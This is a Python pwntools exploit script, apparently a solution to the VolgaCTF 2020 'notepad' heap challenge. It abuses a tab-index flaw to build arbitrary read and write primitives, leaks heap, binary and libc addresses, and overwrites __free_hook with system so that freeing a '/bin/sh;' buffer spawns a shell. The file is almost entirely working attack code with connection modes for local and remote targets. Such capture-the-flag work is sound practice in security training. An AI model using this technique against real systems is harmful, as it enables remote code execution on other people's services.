#!/usr/bin/env python
"""Exploit script template."""
import sys
import subprocess
import codecs
from pwn import *

context.log_level = 'info'

BINARY = "./notepad"
LIB = "./libc-2.27.so"
HOST = 'notepad.q.2020.volgactf.ru'
PORT = 45678

GDB_COMMANDS = ['b *0x0000555555554d32', 'c']
GDB_COMMANDS = ['b *0x0000555555554f99', 'c']
GDB_COMMANDS = ['b *0x00005555555550A6', 'c']
GDB_COMMANDS = ['c']


MENU="""Pick an existing notebook or create a new one
[p]ick    notebook
[a]dd     notebook
[d]elete  notebook
[l]ist    notebook
[q]uit

>"""

MENU_TABS_1="""Operations with notebook """

MENU_TABS_2="""
[a]dd     tab
[v]iew    tab
[u]pdate  tab
[d]elete  tab
[l]ist    tabs
[q]uit

>"""


def notebook_add(p, name):
    p.sendlineafter(MENU, "a")
    p.sendlineafter("Enter notebook name: ", name)

def notebook_delete(p, index):
    p.sendlineafter(MENU, "d")
    p.sendlineafter("Enter index of a notebook to delete: ", str(index))

def notebook_pick(p, index):
    p.sendlineafter(MENU, "p")
    p.sendlineafter("Enter index of a notebook to pick: ", str(index))

def notebook_list(p, ):
    p.sendlineafter(MENU, "l")
    pass


def tab_add(p, name, data, length=None):
    if not length:
        length = len(data)
    p.sendlineafter(MENU_TABS_2, "a")
    p.sendlineafter("Enter tab name: ", name)
    p.sendlineafter("Enter data length (in bytes): ", str(length))
    p.sendlineafter("Enter the data: ", data)

    assert(not b"reached the limit" in p.recvuntil(MENU_TABS_1, drop=True))

def tab_view(p, index):
    p.sendlineafter(MENU_TABS_2, "v")
    p.sendlineafter("Enter index of a tab to view: ", str(index))

    result = p.recvuntil(MENU_TABS_1, drop=True)
    assert(not b"Wrong tab index " in result)
    return result

def tab_delete(p, index, menu=True):
    p.sendlineafter(MENU_TABS_2, "d")
    p.sendlineafter("Enter index of tab to delete: ", str(index))

    if menu:
        assert(not b"Wrong tab index " in p.recvuntil(MENU_TABS_1, drop=True))

def tab_update(p, index, name=None, data=None, length=None):
    if not length and data:
        length = len(data)
    p.sendlineafter(MENU_TABS_2, "u")
    p.sendlineafter("Enter index of tab to update: ", str(index))
    p.sendlineafter("Enter new tab name (leave empty to skip): ", name if name else "")
    p.sendlineafter("Enter new data length (leave empty to keep the same): ", str(length) if data else "")
    p.sendlineafter("Enter the data:", data if data else "")

def tab_quit(p):
    p.sendlineafter(MENU_TABS_2, "q")

def tab_list(p):
    p.sendlineafter(MENU_TABS_2, "l")
    p.recvuntil("List of tabs:")
    return p.recvuntil(MENU_TABS_1, drop=True)


def _parse_leak(leak):
    """Parses the heap address from the leaked string."""
    leak = leak.strip(b'\n')
    leak = leak.split(b'\n')[-1]
    leak = leak.replace(b"[196] ", b"")
    leak = u64(leak.ljust(8, b"\0"))
    leak -= 0x9270
    return leak


def exploit(p, mode, libc):
    """Exploit goes here."""

    def read_64(address):
        pass

    # getting heap leak
    notebook_add(p, "A"*0x10 + "\xc4") # 1
    notebook_add(p, "B"*0x8) # 2
    notebook_add(p, "C"*0x8) # 3
    notebook_add(p, "D"*0x8) # 4

    notebook_pick(p, 4)
    tab_add(p, "aaaa", "b"*8) # the 8 here is important and makes read_64 reliable
    tab_quit(p)

    notebook_pick(p, 1)
    heap_leak = tab_list(p)
    tab_quit(p)

    heap_leak = _parse_leak(heap_leak)
    log.info(f"heap @ address 0x{heap_leak:016x}")

    def read_64(address):
        """Leaks a value."""
        log.debug(f"read_64(0x{address:016x})")
        p_address = p64(address).rstrip(b'\0')

        # Set address
        notebook_pick(p, 1)
        tab_update(p, 196, name=p_address)
        tab_quit(p)

        # Read the value
        notebook_pick(p, 4)
        value = tab_view(p, 1)
        tab_quit(p)

        return u64(value[0:8])

    def write_64(address, value):
        """Writes a value."""
        log.debug(f"write_64(0x{address:016x})")
        p_address = p64(address).rstrip(b'\0')

        # Set address
        notebook_pick(p, 1)
        tab_update(p, 196, name=p_address)
        tab_quit(p)

        # Write the value
        notebook_pick(p, 4)
        tab_update(p, 1, data=p64(value), length=8)
        tab_quit(p)

    # Get libc addr to heap
    notebook_add(p, "E"*0x8) # 5
    notebook_pick(p, 5)
    for i in range(10):
        tab_add(p, "name", "a", 0x100)
    for i in range(10):
        tab_delete(p, 1)
    tab_quit(p)

    # Get address of libc from heap
    libc_leak = read_64(heap_leak + 0x9a08) # This is where we can find the libc address
    log.info(f"libc_leak: 0x{libc_leak:016x}")

    # Get address of notepad from libc
    notepad_leak = read_64(libc_leak - 0xcf0) # This is the offset to a ref to notepad
    log.debug(f"notepad_leak: 0x{notepad_leak:016x}")

    notepad_leak -= 0x203030
    context.binary.address = notepad_leak
    log.info(f"notepad @ address 0x{notepad_leak:016x}")

    # Fingerprint the libc (I used Ubuntu glibc 2.27-3ubuntu1)
    # libc BuildID: BuildID[sha1]=b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0
    #for func in ("malloc", "read", "fgets", "puts"):
    #    leak = read_64(context.binary.got[func])
    #    log.info(f"{func} @ address 0x{leak:016x}")

    # Get the actual libc address
    malloc_leak = read_64(context.binary.got["malloc"])
    log.debug(f"malloc @ address 0x{malloc_leak:016x}")
    libc.address = malloc_leak - libc.sym["malloc"]
    log.info(f"libc @ address 0x{libc.address:016x}")

    # Set free hook to system
    write_64(libc.sym["__free_hook"], libc.sym["system"])

    # trigger free
    notebook_pick(p, 5)
    tab_add(p, "boom", "/bin/sh;", 0x10)
    tab_delete(p, 1, False)

    p.interactive()


### RUN ###

def main():
    """Does general setup and calls exploit."""
    if len(sys.argv) < 2:
        print("Usage: {} <mode>".format(sys.argv[0]))
        sys.exit(0)

    try:
        context.binary = ELF(BINARY)
    except IOError:
        print("Could not load binary ({})".format(BINARY))

    try:
        libc = ELF(LIB)
        env = os.environ
        env['LD_PRELOAD'] = LIB
    except IOError:
        print("Could not load library ({})".format(LIB))

    mode = sys.argv[1]

    if mode == "local":
        p = remote("pwn.local", 2222)
    elif mode == "debug":
        p = remote("pwn.local", 2223)
        gdb_cmd = ['tmux',
                   'split-window',
                   '-p',
                   '66',
                   'gdb',
                   '-ex',
                   'target remote pwn.local:2224',
                   ]

        for cmd in GDB_COMMANDS:
            gdb_cmd.append("-ex")
            gdb_cmd.append(cmd)

        gdb_cmd.append(BINARY)

        subprocess.Popen(gdb_cmd)

    elif mode == "remote":
        p = remote(HOST, PORT)
    else:
        print("Invalid mode")
        sys.exit(1)

    exploit(p, mode, libc)

if __name__ == "__main__":

    main()
